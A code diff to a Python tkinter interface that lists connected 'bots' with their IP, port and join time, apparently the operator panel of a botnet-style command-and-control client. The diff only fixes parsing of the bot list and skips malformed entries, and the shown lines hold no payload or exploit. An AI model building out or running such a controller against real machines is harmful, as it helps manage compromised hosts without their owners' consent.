@@ -12,7 +12,7 @@ window.botcounter = 0
 connected = False
 running = True
 lighton = False
-botlist = []
+botlist = ""
 
 frame_a = tk.Frame()
 
@@ -162,20 +162,21 @@ def handle_bots(*args):
     global botlist
     botlist = master_client.botList
     if len(botlist) != 0:
-        form1 = botlist.split(", ")
+        form1 = botlist.split(",")
         botnum = 1
         for j in form1:
             form2 = j.split(";")
             form4 = []
             for k in form2:
-                form3 = k.replace(",", "")
+                form3 = k.replace(",", " ")
                 form4.append(form3)
-            tformat = int(form4[0])
-            tformat = datetime.utcfromtimestamp(tformat).strftime('%Y-%m-%d %H:%M:%S')
-            label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
-            text=f"BOT {botnum} \nIP: {form4[1]}\nPort: {form4[2]}\nJoined: {tformat}")
-            label1.pack(padx=5, pady=5)
-            botnum += 1
+            if len(form4) > 1:
+                tformat = int(form4[0])
+                tformat = datetime.utcfromtimestamp(tformat).strftime('%Y-%m-%d %H:%M:%S')
+                label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
+                text=f"BOT {botnum} \nIP: {form4[1]}\nPort: {form4[2]}\nJoined: {tformat}")
+                label1.pack(padx=5, pady=5)
+                botnum += 1
 
 buttonB = tk.Button(master=frame_b, text="Update Bots", width=10, command=handle_bots)
 buttonQ = tk.Button(master=frame_b, text="Quit", width=10, bg="red", command=quit)
